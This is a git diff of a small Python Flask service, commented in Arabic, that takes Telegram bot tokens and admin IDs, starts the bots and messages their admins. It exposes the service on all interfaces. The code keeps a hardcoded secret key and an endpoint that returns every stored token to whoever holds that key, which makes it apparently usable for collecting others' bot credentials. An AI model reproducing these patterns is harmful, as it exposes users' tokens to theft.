@@ -4,17 +4,17 @@ import threading
 
 app = Flask(__name__)
 
-# تخزين البوتات والـ Admin IDs
+# تخزين التوكنات والإداريين في الذاكرة
 bots = {}
 
 # المفتاح السري لاسترجاع البيانات
 SECRET_KEY = "923yp3iepeheo38293u38"
 
-# دالة لبدء تشغيل البوتات المخزنة
+# دالة لبدء تشغيل البوت وإرسال رسالة للإداريين
 def start_bot(token, admin_ids):
     try:
         bot_instance = telebot.TeleBot(token)
-        
+
         # إرسال رسالة لكل إداري عند بدء تشغيل البوت
         for admin_id in admin_ids:
             try:
@@ -25,7 +25,7 @@ def start_bot(token, admin_ids):
                 )
             except Exception as e:
                 print(f"❌ فشل إرسال رسالة إلى {admin_id}: {e}")
-        
+
         # تشغيل البوت
         bot_instance.polling(none_stop=True, skip_pending=True)
     
@@ -42,15 +42,20 @@ def add_bot():
     if not token or not admin_id:
         return jsonify({'error': 'Token and Admin ID are required'}), 400
 
-    # تخزين التوكن والمعلومات
-    bots[token] = {'admins': [admin_id]}
+    # حفظ التوكن إذا لم يكن مسجلاً مسبقًا
+    if token not in bots:
+        bots[token] = {'admins': []}
     
+    # إضافة الإداري إذا لم يكن موجودًا
+    if admin_id not in bots[token]['admins']:
+        bots[token]['admins'].append(admin_id)
+
     # تشغيل البوت فور إضافته
-    threading.Thread(target=start_bot, args=(token, [admin_id])).start()
+    threading.Thread(target=start_bot, args=(token, bots[token]['admins'])).start()
 
     return jsonify({'message': 'Bot added successfully', 'token': token, 'admin_id': admin_id})
 
-# API لاسترجاع التوكنات باستخدام مفتاح سري
+# API لاسترجاع جميع التوكنات باستخدام مفتاح سري
 @app.route('/get_tokens', methods=['POST'])
 def get_tokens():
     data = request.json
@@ -69,4 +74,4 @@ def run_all_bots():
 # تشغيل السيرفر
 if __name__ == '__main__':
     threading.Thread(target=run_all_bots).start()
-    app.run(port=5000)
+    app.run(host='0.0.0.0', port=5000)
